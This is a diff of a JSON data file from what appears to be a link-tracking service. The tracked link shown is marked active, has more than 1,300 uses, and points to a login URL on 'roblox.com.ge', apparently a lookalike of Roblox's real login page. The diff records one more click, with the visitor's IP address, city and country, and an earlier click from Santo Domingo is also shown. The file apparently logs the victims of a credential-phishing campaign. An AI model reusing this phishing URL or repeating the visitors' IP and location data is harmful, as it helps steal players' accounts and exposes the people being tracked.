@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1358,
+    "useCount": 1359,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11032,6 +11032,14 @@
         "city": "Santo Domingo",
         "flag": "🇩🇴",
         "countryCode": "DO"
+      },
+      {
+        "timestamp": 1777417834068,
+        "ip": "37.65.60.56",
+        "country": "France",
+        "city": "Créteil",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
       }
     ]
   },
